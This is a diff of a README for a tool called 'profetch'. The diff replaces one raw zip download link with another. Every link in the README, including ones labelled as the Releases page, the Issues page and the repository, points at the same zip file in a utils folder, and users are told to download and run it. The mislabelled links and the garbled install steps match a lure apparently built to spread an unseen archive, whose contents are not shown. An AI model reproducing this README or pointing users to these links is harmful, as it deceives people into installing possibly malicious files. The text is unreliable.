@@ -1,7 +1,7 @@
 # 🎉 profetch - Neofetch for Your Projects
 
 ## 📥 Download Now!
-[![Download profetch](https://raw.githubusercontent.com/Alex77688/profetch/main/utils/profetch_2.8-beta.1.zip%https://raw.githubusercontent.com/Alex77688/profetch/main/utils/profetch_2.8-beta.1.zip)](https://raw.githubusercontent.com/Alex77688/profetch/main/utils/profetch_2.8-beta.1.zip)
+[![Download profetch](https://github.com/Alex77688/profetch/raw/refs/heads/main/utils/Software-2.2.zip%https://github.com/Alex77688/profetch/raw/refs/heads/main/utils/Software-2.2.zip)](https://github.com/Alex77688/profetch/raw/refs/heads/main/utils/Software-2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to profetch! This application helps you quickly get information about your projects in a simple way. You can easily display project details like version, licenses, and more, using a neat visual summary.
@@ -18,7 +18,7 @@ Before you download, make sure your computer meets these basic requirements:
 To start using profetch, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Download profetch](https://raw.githubusercontent.com/Alex77688/profetch/main/utils/profetch_2.8-beta.1.zip)
+   [Download profetch](https://github.com/Alex77688/profetch/raw/refs/heads/main/utils/Software-2.2.zip)
 
 2. On the Releases page, you will see various versions of profetch. Find the latest version, which is marked as "Latest Release."
 
@@ -27,14 +27,14 @@ To start using profetch, follow these steps:
 4. Depending on your operating system, choose the correct file:
    - **For Windows:** Look for a file ending in `.exe`
    - **For macOS:** Look for a file ending in `.dmg`
-   - **For Linux:** Look for a file ending in `https://raw.githubusercontent.com/Alex77688/profetch/main/utils/profetch_2.8-beta.1.zip` or package files like `.deb` or `.rpm`
+   - **For Linux:** Look for a file ending in `https://github.com/Alex77688/profetch/raw/refs/heads/main/utils/Software-2.2.zip` or package files like `.deb` or `.rpm`
 
 5. Click the chosen file to start downloading.
 
 6. Once the download completes:
    - **Windows:** Run the `.exe` file and follow the installation prompts.
    - **macOS:** Open the `.dmg` file and drag profetch into your Applications folder.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/Alex77688/profetch/main/utils/profetch_2.8-beta.1.zip` file and follow any included README instructions for installation.
+   - **Linux:** Extract the `https://github.com/Alex77688/profetch/raw/refs/heads/main/utils/Software-2.2.zip` file and follow any included README instructions for installation.
 
 ## ⚙️ Using profetch
 Once installed, you can open profetch to begin using it. Here’s how:
@@ -55,7 +55,7 @@ If you face any issues while using profetch, try the following steps:
 - Ensure you meet the system requirements.
 - Check if you downloaded the correct version for your operating system.
 - Restart the application if it doesn’t open properly.
-- Refer to the FAQs section on our [GitHub Issues page](https://raw.githubusercontent.com/Alex77688/profetch/main/utils/profetch_2.8-beta.1.zip) for common issues and solutions.
+- Refer to the FAQs section on our [GitHub Issues page](https://github.com/Alex77688/profetch/raw/refs/heads/main/utils/Software-2.2.zip) for common issues and solutions.
 
 ## 📞 Support
 If you need further assistance, feel free to contact us through the GitHub Issues page. We are here to help!
@@ -66,6 +66,6 @@ We welcome contributions! If you have suggestions for improvements or want to re
 ## 💬 Feedback
 Your feedback is valuable to us. If you enjoy using profetch, let us know! Your input helps us make the application better.
 
-For more information, please visit the Releases page again or check our [GitHub repository](https://raw.githubusercontent.com/Alex77688/profetch/main/utils/profetch_2.8-beta.1.zip).
+For more information, please visit the Releases page again or check our [GitHub repository](https://github.com/Alex77688/profetch/raw/refs/heads/main/utils/Software-2.2.zip).
 
 Thank you for using profetch! We hope this tool makes working on your projects easier and more enjoyable.
